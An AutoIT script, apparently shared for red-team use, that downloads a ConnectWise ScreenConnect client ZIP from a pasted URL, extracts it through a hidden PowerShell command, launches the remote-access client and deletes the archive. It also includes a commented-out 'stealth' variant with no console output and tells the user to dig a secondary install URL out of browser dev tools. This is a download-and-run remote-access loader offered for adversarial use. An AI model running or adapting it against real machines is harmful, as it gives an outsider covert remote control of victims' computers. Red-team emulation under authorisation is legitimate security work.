; AutoIT script to download, extract, and run ScreenConnect client for remote support sessions. 
; For AutoIT, you can install AutoIT or create a wrapper to run the script with the app exe, or create an AutoIT compiled executable.
; This script is for testing/red team purposes - use only for legal and ethical testing scenarios
; For red team/adversarial emulation, you may want to adapt to your specific purposes.  
; Paste your URL for ConnectWise ScreenConnect where it says (Paste Install URL here).  
; Note: This is not the URL they give you; it is the secondary URL you hunt for via F12, network, and filter on zip.
; See the Readme.md files for how to use, including detailed setup steps.  

#include <InetConstants.au3>
#include <Array.au3>
#include <File.au3>
#include <WinAPIFiles.au3>

; Configuration
Local $downloadUrl = "(Paste Install URL here)"  ; Replace with your ScreenConnect URL
Local $zipName = "ScreenConnect.WindowsClient.zip"
Local $exeName = "ScreenConnect.Client.exe"

; Get script directory
Local $scriptFolder = @ScriptDir
Local $zipPath = $scriptFolder & "\" & $zipName

; Download the ZIP file
ConsoleWrite("Downloading " & $zipName & "..." & @CRLF)
Local $hDownload = InetGet($downloadUrl, $zipPath, $INET_FORCERELOAD, $INET_DOWNLOADBACKGROUND)

; Wait for download to complete
Do
    Sleep(250)
Until InetGetInfo($hDownload, $INET_DOWNLOADCOMPLETE)

; Check if download was successful
If Not FileExists($zipPath) Or FileGetSize($zipPath) = 0 Then
    ConsoleWrite("Download failed. File not found or is empty." & @CRLF)
    Exit 1
EndIf

ConsoleWrite("Download complete. Extracting files..." & @CRLF)

; Extract ZIP using PowerShell (most reliable method)
Local $psCommand = 'powershell -Command "Expand-Archive -Path ''' & $zipPath & ''' -DestinationPath ''' & $scriptFolder & ''' -Force"'
Local $result = RunWait($psCommand, "", @SW_HIDE)

; Wait for extraction to complete
Sleep(2000)

; Look for the executable
Local $exePath = FindFileRecursive($scriptFolder, $exeName)

If $exePath = "" Then
    ConsoleWrite("Error: " & $exeName & " not found after extraction." & @CRLF)
    Exit 1
EndIf

ConsoleWrite("Found executable at: " & $exePath & @CRLF)
ConsoleWrite("Launching application..." & @CRLF)

; Run the executable
Local $pid = Run('"' & $exePath & '"', "", @SW_SHOW)

If $pid = 0 Then
    ConsoleWrite("Error: Failed to launch application." & @CRLF)
    Exit 1
EndIf

; Clean up the ZIP file
If FileExists($zipPath) Then
    FileDelete($zipPath)
EndIf

ConsoleWrite("Application launched successfully." & @CRLF)
Exit 0

; Helper function to find file recursively
Func FindFileRecursive($folder, $targetName)
    Local $search = FileFindFirstFile($folder & "\*")
    Local $fileName, $fullPath
    
    If $search = -1 Then Return ""
    
    While 1
        $fileName = FileFindNextFile($search)
        If @error Then ExitLoop
        
        $fullPath = $folder & "\" & $fileName
        
        ; Check if it's the target file
        If StringLower($fileName) = StringLower($targetName) Then
            FileClose($search)
            Return $fullPath
        EndIf
        
        ; If it's a directory, search recursively
        If StringInStr(FileGetAttrib($fullPath), "D") Then
            Local $result = FindFileRecursive($fullPath, $targetName)
            If $result <> "" Then
                FileClose($search)
                Return $result
            EndIf
        EndIf
    WEnd
    
    FileClose($search)
    Return ""
EndFunc

; Alternative version without console output (for stealth operations)
; Uncomment the function below and comment out the main script above for silent execution

#cs
Func SilentDownloadAndRun()
    Local $downloadUrl = "(Paste Install URL here)"
    Local $zipName = "ScreenConnect.WindowsClient.zip"
    Local $exeName = "ScreenConnect.Client.exe"
    Local $scriptFolder = @ScriptDir
    Local $zipPath = $scriptFolder & "\" & $zipName
    
    ; Download silently
    Local $hDownload = InetGet($downloadUrl, $zipPath, $INET_FORCERELOAD, $INET_DOWNLOADBACKGROUND)
    Do
        Sleep(250)
    Until InetGetInfo($hDownload, $INET_DOWNLOADCOMPLETE)
    
    If Not FileExists($zipPath) Or FileGetSize($zipPath) = 0 Then Exit 1
    
    ; Extract silently
    Local $psCommand = 'powershell -Command "Expand-Archive -Path ''' & $zipPath & ''' -DestinationPath ''' & $scriptFolder & ''' -Force"'
    RunWait($psCommand, "", @SW_HIDE)
    Sleep(2000)
    
    ; Find and run executable
    Local $exePath = FindFileRecursive($scriptFolder, $exeName)
    If $exePath = "" Then Exit 1
    
    Run('"' & $exePath & '"', "", @SW_SHOW)
    
    ; Cleanup
    If FileExists($zipPath) Then FileDelete($zipPath)
EndFunc
#ce
